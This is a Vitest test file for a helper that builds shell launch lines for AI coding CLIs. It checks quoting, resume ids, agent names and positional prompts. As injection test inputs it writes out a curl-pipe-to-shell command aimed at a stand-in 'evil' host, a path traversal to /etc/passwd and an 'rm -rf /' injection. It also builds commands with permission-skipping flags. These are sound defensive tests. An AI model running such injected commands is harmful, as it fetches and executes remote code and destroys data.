import { describe, expect, it } from "vitest";
import { buildCliCommand, buildCliLaunchLine } from "@/lib/terminal";

describe("buildCliCommand resume-id safety", () => {
  it("includes a UUID-shaped resume id", () => {
    const cmd = buildCliCommand("Claude", undefined, "01234567-89ab-cdef-0123-456789abcdef");
    expect(cmd).toBe("claude --resume 01234567-89ab-cdef-0123-456789abcdef");
  });

  it("rejects a resume id containing shell metacharacters", () => {
    // An attacker-planted transcript could carry such a sessionId; buildCliCommand
    // must refuse rather than let it reach the shell PTY.
    expect(() => buildCliCommand("Claude", undefined, "x; curl http://evil | sh")).toThrow(
      /unsafe resume session id/i,
    );
  });

  it("rejects a resume id with a path traversal", () => {
    expect(() => buildCliCommand("Claude", undefined, "../../etc/passwd")).toThrow(
      /unsafe resume session id/i,
    );
  });

  it("builds a normal command when no resume id is given", () => {
    expect(buildCliCommand("Claude", { skipPermissions: false, customFlags: "" })).toBe("claude");
  });
});

// --- issue #158: the gen-1 pointer as a positional launch-line argument ---

describe("buildCliLaunchLine", () => {
  const FLAGS = { skipPermissions: true, customFlags: "" };
  const POINTER =
    "[Maestro Samurai] Read `.maestro/briefs/epic-38-gen-1-launch.md` in FULL with the Read tool";

  it("appends the pointer as one quoted positional argument on posix", () => {
    const line = buildCliLaunchLine("Claude", FLAGS, undefined, POINTER, "posix");
    expect(line).toEqual({
      command: `claude --dangerously-skip-permissions '${POINTER}'`,
      launchPromptDelivered: true,
    });
  });

  it("appends the pointer as one quoted positional argument on cmd", () => {
    const line = buildCliLaunchLine("Claude", FLAGS, undefined, POINTER, "cmd");
    expect(line).toEqual({
      command: `claude --dangerously-skip-permissions "${POINTER}"`,
      launchPromptDelivered: true,
    });
  });

  it("keeps the pointer AFTER every flag, so it stays the positional prompt", () => {
    const line = buildCliLaunchLine(
      "Claude",
      { skipPermissions: true, customFlags: "--model sonnet" },
      "01234567-89ab-cdef-0123-456789abcdef",
      POINTER,
      "posix",
    );
    expect(line?.command).toBe(
      "claude --resume 01234567-89ab-cdef-0123-456789abcdef " +
        `--dangerously-skip-permissions --model sonnet '${POINTER}'`,
    );
  });

  it("reports NOT delivered when there is no prompt to carry", () => {
    expect(buildCliLaunchLine("Claude", FLAGS, undefined, null, "posix")).toEqual({
      command: "claude --dangerously-skip-permissions",
      launchPromptDelivered: false,
    });
  });

  it("refuses the launch line rather than half-escaping it, and says so", () => {
    // A `%` cannot be escaped for cmd.exe at all — the caller must fall back
    // to the typed pointer, so the command comes back WITHOUT the prompt.
    const line = buildCliLaunchLine("Claude", FLAGS, undefined, "read 100% of it", "cmd");
    expect(line).toEqual({
      command: "claude --dangerously-skip-permissions",
      launchPromptDelivered: false,
    });
  });

  it("never puts a prompt on a non-Claude launch line", () => {
    // Only `claude` is known to take a positional initial prompt; Gemini and
    // Codex would read it as something else entirely.
    const line = buildCliLaunchLine("Gemini", FLAGS, undefined, POINTER, "posix");
    expect(line).toEqual({ command: "gemini --yolo", launchPromptDelivered: false });
  });

  it("returns null for a mode with no CLI at all", () => {
    expect(buildCliLaunchLine("Plain", FLAGS, undefined, POINTER, "posix")).toBeNull();
  });

  it("refuses when the shell family is unknown", () => {
    // The backend answers null for any shell without a verified quoter
    // (PowerShell as COMSPEC, csh as $SHELL). Guessing there is the bug.
    expect(buildCliLaunchLine("Claude", FLAGS, undefined, POINTER, null)).toEqual({
      command: "claude --dangerously-skip-permissions",
      launchPromptDelivered: false,
    });
  });

  it("refuses when user custom flags could swallow the prompt as their value", () => {
    // `customFlags` is free text appended immediately before the positional:
    // a trailing value-taking flag would eat the pointer, and reporting
    // success would ALSO suppress the typed fallback — brief never delivered.
    const line = buildCliLaunchLine(
      "Claude",
      { skipPermissions: true, customFlags: "--append-system-prompt" },
      undefined,
      POINTER,
      "posix",
    );
    expect(line).toEqual({
      command: "claude --dangerously-skip-permissions --append-system-prompt",
      launchPromptDelivered: false,
    });
  });

  it("still allows the trusted --model flag the samurai flow generates", () => {
    // `samuraiSuccessorCliFlags` puts the run config's model on this channel
    // with a token-restricted value, and it always carries its own value —
    // refusing it would disable the launch line for most real runs.
    const line = buildCliLaunchLine(
      "Claude",
      { skipPermissions: true, customFlags: "--model claude-opus-4-5" },
      undefined,
      POINTER,
      "posix",
    );
    expect(line).toEqual({
      command: `claude --dangerously-skip-permissions --model claude-opus-4-5 '${POINTER}'`,
      launchPromptDelivered: true,
    });
  });
});

describe("buildCliCommand agent name", () => {
  it("launches claude under the given agent name", () => {
    expect(buildCliCommand("Claude", undefined, undefined, "maestro-42")).toBe(
      "claude --name maestro-42",
    );
  });

  it("refuses an agent name that is not terminal-safe", () => {
    expect(() => buildCliCommand("Claude", undefined, undefined, "x; rm -rf /")).toThrow(
      /unsafe agent name/i,
    );
  });

  it("ignores the agent name for other CLIs", () => {
    expect(buildCliCommand("Gemini", undefined, undefined, "maestro-42")).toBe("gemini");
  });

  it("keeps the name ahead of a positional launch prompt", () => {
    const line = buildCliLaunchLine("Claude", undefined, undefined, "go", "posix", "maestro-42");
    expect(line).toEqual({ command: "claude --name maestro-42 'go'", launchPromptDelivered: true });
  });
});
